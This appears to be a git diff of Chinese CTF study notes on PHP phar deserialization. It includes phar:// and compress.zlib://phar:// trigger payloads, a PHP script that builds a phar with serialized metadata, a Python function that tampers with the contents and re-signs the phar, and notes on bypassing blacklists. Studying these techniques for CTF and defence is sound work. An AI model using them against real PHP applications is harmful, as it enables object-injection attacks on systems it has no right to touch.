@@ -433,7 +433,7 @@ payload`file.php?file=phar://upload/337def6af3af5b39784016d8a5e06f8c.jpg`
 
 ---
 
->todo 2019年新生赛 image-checker
+[xp0int-2019-ctf-web/image-checker](https://github.com/mi3aka/xp0int-2019-ctf-web/tree/master/image-checker)
 
 从`class.php`可以得知存在`curl_exec`,可以使用`file://`协议来进行文件读取
 
@@ -468,7 +468,48 @@ $phar->stopBuffering();
 
 在check image size中传入`compress.zlib://phar://uploads/487dfa0355.jpeg/test.jpeg`即可
 
-### phar包签名篡改
+### phar包内容篡改/重新签名
+
+```php
+<?php
+
+class DemoA
+{
+    public $a;
+
+    public function __destruct()
+    {
+        echo $this->a . "DemoA" . "<br>";
+    }
+}
+
+class DemoB
+{
+    public $a;
+
+    public function __destruct()
+    {
+        echo $this->a . "DemoB" . "<br>";
+    }
+}
+
+$phar = new Phar("a.phar"); //创建phar文件时后缀名必须为phar
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置存根stub
+
+$a = new DemoA();
+$b = new DemoB();
+$a->a = "asdf";
+$b->a = "qwer";
+$arr = array($a, $b);
+var_dump(serialize($arr));
+
+$phar->setMetadata($arr); //将自定义的meta-data序列化后存入manifest
+$phar->addFromString("a", "a"); //phar本质上是对文件的压缩所以要添加要压缩的文件
+$phar->stopBuffering();
+```
+
+`a:2:{i:0;O:5:"DemoA":1:{s:1:"a";s:4:"asdf";}i:1;O:5:"DemoB":1:{s:1:"a";s:4:"qwer";}}`
 
 假设需要对生成的phar包中的内容进行篡改,由于phar包存在签名校验机制,因此除了对内容进行篡改外,还需要对phar包进行重新签名
 
@@ -484,40 +525,97 @@ $phar->stopBuffering();
 
 3. `GBMB`标记
 
-
->todo
-
-![img]()
+![](2021-12-06%2018-59-07%20的屏幕截图.png)
 
 ```python
-def resign(source="source.phar",target="target.phar"):
+import hashlib
+
+
+def resign(source="a.phar",target="out.phar"):
     phar=None
     with open(source,"rb") as f:
         phar=f.read()
-    phar=phar.replace(b'i:1;O:4:"fake":0:{}',b'i:0;O:4:"fake":0:{}') #篡改phar包中的内容
+    phar=phar.replace(b'i:1;O:5:',b'i:0;O:5:') #篡改phar包中的内容
+    phar=phar.replace(b'asdf',b'1234') #篡改phar包中的内容
+    phar=phar.replace(b'qwer',b'5678') #篡改phar包中的内容
     source=phar[:-28] #需要进行签名的数据
     GBMB=phar[-8:] #签名标志(通常都是sha1??)和GBMB标签
     signature=hashlib.sha1(source).digest() #sha1签名
     phar=source+signature+GBMB
     with open(target,"wb") as f:
         f.write(phar)
+
+resign()
 ```
 
+![](2021-12-06%2018-59-13%20的屏幕截图.png)
 
+```php
+<?php
 
+class DemoA
+{
+    public $a;
 
+    public function __destruct()
+    {
+        var_dump($this->a . "DemoA");
+    }
+}
 
+class DemoB
+{
+    public $a;
 
+    public function __destruct()
+    {
+        var_dump($this->a . "DemoB");
+    }
+}
 
+$filename = "phar:///var/www/html/out.phar";
+var_dump(file_exists($filename));
+echo "<br>";
+$filename = "phar:///var/www/html/a.phar";
+var_dump(file_exists($filename));
+echo "<br>";
+```
 
+```
+string '1234DemoA' (length=9)
+boolean true
+
+boolean true
+
+string 'asdfDemoA' (length=9)
+string '5678DemoB' (length=9)
+string 'qwerDemoB' (length=9)
+```
+
+尝试抛弃phar签名
+
+[phar.require_hash](https://www.php.net/manual/zh/phar.configuration.php#ini.phar.require-hash)
+
+此选项要求调用的所有Phar归档必须包含签名(目前支持的签名类型有MD5,SHA1,SHA256,SHA512,OpenSSL),而且会拒绝处理不含签名的Phar归档
+
+>注意:
+
+只能在`php.ini`中取消此设置
+
+若在`php.ini`中禁用`phar.require_hash`,可以在代码中启用 `phar.require_hash`或其后禁用它
+
+若在`php.ini`中启用`phar.require_hash`,在代码中可以"重复启用"INI变量,但不能禁用
+
+此选项不影响`PharData`类读取普通`tar`文件 
+
+>todo 还是没整明白怎么抛弃phar签名qwq(我菜炸了...) 可能要康康底层了
+
+>todo $phar->setMetadata
 
 ### 将phar文件打包绕过黑名单限制
 
+[从虎符线下CTF深入反序列化利用](https://guokeya.github.io/post/uxwHLckwx/)
 
-
+phar文件再进过压缩,打包等处理后依然可以使用`phar://`协议正常读取
 
 >todo
-
-
-
-phar文件再进过压缩、打包等处理后都是依然可以使用phar://协议正常读取了
